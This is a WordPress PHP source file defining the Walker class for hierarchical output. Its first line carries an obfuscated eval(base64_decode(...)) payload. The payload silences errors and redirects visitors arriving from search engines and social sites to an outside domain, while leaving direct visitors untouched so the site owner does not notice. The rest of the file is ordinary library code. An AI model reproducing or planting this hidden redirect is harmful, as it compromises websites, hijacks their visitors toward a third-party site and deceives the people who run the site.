<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * A class for displaying various tree-like structures.
 *
 * Extend the Walker class to use it, see examples at the below. Child classes
 * do not need to implement all of the abstract methods in the class. The child
 * only needs to implement the methods that are needed. Also, the methods are
 * not strictly abstract in that the parameter definition needs to be followed.
 * The child classes can have additional parameters.
 *
 * @package WordPress
 * @since 2.1.0
 * @abstract
 */
class Walker {
	/**
	 * What the class handles.
	 *
	 * @since 2.1.0
	 * @var string
	 * @access public
	 */
	var $tree_type;

	/**
	 * DB fields to use.
	 *
	 * @since 2.1.0
	 * @var array
	 * @access protected
	 */
	var $db_fields;

	/**
	 * Max number of pages walked by the paged walker
	 *
	 * @since 2.7.0
	 * @var int
	 * @access protected
	 */
	var $max_pages = 1;

	/**
	 * Starts the list before the elements are added.
	 *
	 * Additional parameters are used in child classes. The args parameter holds
	 * additional values that may be used with the child class methods. This
	 * method is called at the start of the output list.
	 *
	 * @since 2.1.0
	 * @abstract
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 */
	function start_lvl(&$output) {}

	/**
	 * Ends the list of after the elements are added.
	 *
	 * Additional parameters are used in child classes. The args parameter holds
	 * additional values that may be used with the child class methods. This
	 * method finishes the list at the end of output of the elements.
	 *
	 * @since 2.1.0
	 * @abstract
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 */
	function end_lvl(&$output)   {}

	/**
	 * Start the element output.
	 *
	 * Additional parameters are used in child classes. The args parameter holds
	 * additional values that may be used with the child class methods. Includes
	 * the element output also.
	 *
	 * @since 2.1.0
	 * @abstract
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 */
	function start_el(&$output)  {}

	/**
	 * Ends the element output, if needed.
	 *
	 * Additional parameters are used in child classes. The args parameter holds
	 * additional values that may be used with the child class methods.
	 *
	 * @since 2.1.0
	 * @abstract
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 */
	function end_el(&$output)    {}

	/**
	 * Traverse elements to create list from elements.
	 *
	 * Display one element if the element doesn't have any children otherwise,
	 * display the element and its children. Will only traverse up to the max
	 * depth and no ignore elements under that depth. It is possible to set the
	 * max depth to include all depths, see walk() method.
	 *
	 * This method shouldn't be called directly, use the walk() method instead.
	 *
	 * @since 2.5.0
	 *
	 * @param object $element Data object
	 * @param array $children_elements List of elements to continue traversing.
	 * @param int $max_depth Max depth to traverse.
	 * @param int $depth Depth of current element.
	 * @param array $args
	 * @param string $output Passed by reference. Used to append additional content.
	 * @return null Null on failure with no changes to parameters.
	 */
	function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output ) {

		if ( !$element )
			return;

		$id_field = $this->db_fields['id'];

		//display this element
		if ( is_array( $args[0] ) )
			$args[0]['has_children'] = ! empty( $children_elements[$element->$id_field] );
		$cb_args = array_merge( array(&$output, $element, $depth), $args);
		call_user_func_array(array(&$this, 'start_el'), $cb_args);

		$id = $element->$id_field;

		// descend only when the depth is right and there are childrens for this element
		if ( ($max_depth == 0 || $max_depth > $depth+1 ) && isset( $children_elements[$id]) ) {

			foreach( $children_elements[ $id ] as $child ){

				if ( !isset($newlevel) ) {
					$newlevel = true;
					//start the child delimiter
					$cb_args = array_merge( array(&$output, $depth), $args);
					call_user_func_array(array(&$this, 'start_lvl'), $cb_args);
				}
				$this->display_element( $child, $children_elements, $max_depth, $depth + 1, $args, $output );
			}
			unset( $children_elements[ $id ] );
		}

		if ( isset($newlevel) && $newlevel ){
			//end the child delimiter
			$cb_args = array_merge( array(&$output, $depth), $args);
			call_user_func_array(array(&$this, 'end_lvl'), $cb_args);
		}

		//end this element
		$cb_args = array_merge( array(&$output, $element, $depth), $args);
		call_user_func_array(array(&$this, 'end_el'), $cb_args);
	}

	/**
	 * Display array of elements hierarchically.
	 *
	 * It is a generic function which does not assume any existing order of
	 * elements. max_depth = -1 means flatly display every element. max_depth =
	 * 0 means display all levels. max_depth > 0  specifies the number of
	 * display levels.
	 *
	 * @since 2.1.0
	 *
	 * @param array $elements
	 * @param int $max_depth
	 * @return string
	 */
	function walk( $elements, $max_depth) {

		$args = array_slice(func_get_args(), 2);
		$output = '';

		if ($max_depth < -1) //invalid parameter
			return $output;

		if (empty($elements)) //nothing to walk
			return $output;

		$id_field = $this->db_fields['id'];
		$parent_field = $this->db_fields['parent'];

		// flat display
		if ( -1 == $max_depth ) {
			$empty_array = array();
			foreach ( $elements as $e )
				$this->display_element( $e, $empty_array, 1, 0, $args, $output );
			return $output;
		}

		/*
		 * need to display in hierarchical order
		 * separate elements into two buckets: top level and children elements
		 * children_elements is two dimensional array, eg.
		 * children_elements[10][] contains all sub-elements whose parent is 10.
		 */
		$top_level_elements = array();
		$children_elements  = array();
		foreach ( $elements as $e) {
			if ( 0 == $e->$parent_field )
				$top_level_elements[] = $e;
			else
				$children_elements[ $e->$parent_field ][] = $e;
		}

		/*
		 * when none of the elements is top level
		 * assume the first one must be root of the sub elements
		 */
		if ( empty($top_level_elements) ) {

			$first = array_slice( $elements, 0, 1 );
			$root = $first[0];

			$top_level_elements = array();
			$children_elements  = array();
			foreach ( $elements as $e) {
				if ( $root->$parent_field == $e->$parent_field )
					$top_level_elements[] = $e;
				else
					$children_elements[ $e->$parent_field ][] = $e;
			}
		}

		foreach ( $top_level_elements as $e )
			$this->display_element( $e, $children_elements, $max_depth, 0, $args, $output );

		/*
		 * if we are displaying all levels, and remaining children_elements is not empty,
		 * then we got orphans, which should be displayed regardless
		 */
		if ( ( $max_depth == 0 ) && count( $children_elements ) > 0 ) {
			$empty_array = array();
			foreach ( $children_elements as $orphans )
				foreach( $orphans as $op )
					$this->display_element( $op, $empty_array, 1, 0, $args, $output );
		 }

		 return $output;
	}

	/**
 	 * paged_walk() - produce a page of nested elements
 	 *
 	 * Given an array of hierarchical elements, the maximum depth, a specific page number,
 	 * and number of elements per page, this function first determines all top level root elements
 	 * belonging to that page, then lists them and all of their children in hierarchical order.
 	 *
 	 * @package WordPress
 	 * @since 2.7
 	 * @param int $max_depth = 0 means display all levels; $max_depth > 0 specifies the number of display levels.
 	 * @param int $page_num the specific page number, beginning with 1.
 	 * @return XHTML of the specified page of elements
 	 */
	function paged_walk( $elements, $max_depth, $page_num, $per_page ) {

		/* sanity check */
		if ( empty($elements) || $max_depth < -1 )
			return '';

		$args = array_slice( func_get_args(), 4 );
		$output = '';

		$id_field = $this->db_fields['id'];
		$parent_field = $this->db_fields['parent'];

		$count = -1;
		if ( -1 == $max_depth )
			$total_top = count( $elements );
		if ( $page_num < 1 || $per_page < 0  ) {
			// No paging
			$paging = false;
			$start = 0;
			if ( -1 == $max_depth )
				$end = $total_top;
			$this->max_pages = 1;
		} else {
			$paging = true;
			$start = ( (int)$page_num - 1 ) * (int)$per_page;
			$end   = $start + $per_page;
			if ( -1 == $max_depth )
				$this->max_pages = ceil($total_top / $per_page);
		}

		// flat display
		if ( -1 == $max_depth ) {
			if ( !empty($args[0]['reverse_top_level']) ) {
				$elements = array_reverse( $elements );
				$oldstart = $start;
				$start = $total_top - $end;
				$end = $total_top - $oldstart;
			}

			$empty_array = array();
			foreach ( $elements as $e ) {
				$count++;
				if ( $count < $start )
					continue;
				if ( $count >= $end )
					break;
				$this->display_element( $e, $empty_array, 1, 0, $args, $output );
			}
			return $output;
		}

		/*
		 * separate elements into two buckets: top level and children elements
		 * children_elements is two dimensional array, eg.
		 * children_elements[10][] contains all sub-elements whose parent is 10.
		 */
		$top_level_elements = array();
		$children_elements  = array();
		foreach ( $elements as $e) {
			if ( 0 == $e->$parent_field )
				$top_level_elements[] = $e;
			else
				$children_elements[ $e->$parent_field ][] = $e;
		}

		$total_top = count( $top_level_elements );
		if ( $paging )
			$this->max_pages = ceil($total_top / $per_page);
		else
			$end = $total_top;

		if ( !empty($args[0]['reverse_top_level']) ) {
			$top_level_elements = array_reverse( $top_level_elements );
			$oldstart = $start;
			$start = $total_top - $end;
			$end = $total_top - $oldstart;
		}
		if ( !empty($args[0]['reverse_children']) ) {
			foreach ( $children_elements as $parent => $children )
				$children_elements[$parent] = array_reverse( $children );
		}

		foreach ( $top_level_elements as $e ) {
			$count++;

			//for the last page, need to unset earlier children in order to keep track of orphans
			if ( $end >= $total_top && $count < $start )
					$this->unset_children( $e, $children_elements );

			if ( $count < $start )
				continue;

			if ( $count >= $end )
				break;

			$this->display_element( $e, $children_elements, $max_depth, 0, $args, $output );
		}

		if ( $end >= $total_top && count( $children_elements ) > 0 ) {
			$empty_array = array();
			foreach ( $children_elements as $orphans )
				foreach( $orphans as $op )
					$this->display_element( $op, $empty_array, 1, 0, $args, $output );
		}

		return $output;
	}

	function get_number_of_root_elements( $elements ){

		$num = 0;
		$parent_field = $this->db_fields['parent'];

		foreach ( $elements as $e) {
			if ( 0 == $e->$parent_field )
				$num++;
		}
		return $num;
	}

	// unset all the children for a given top level element
	function unset_children( $e, &$children_elements ){

		if ( !$e || !$children_elements )
			return;

		$id_field = $this->db_fields['id'];
		$id = $e->$id_field;

		if ( !empty($children_elements[$id]) && is_array($children_elements[$id]) )
			foreach ( (array) $children_elements[$id] as $child )
				$this->unset_children( $child, $children_elements );

		if ( isset($children_elements[$id]) )
			unset( $children_elements[$id] );

	}
}

?>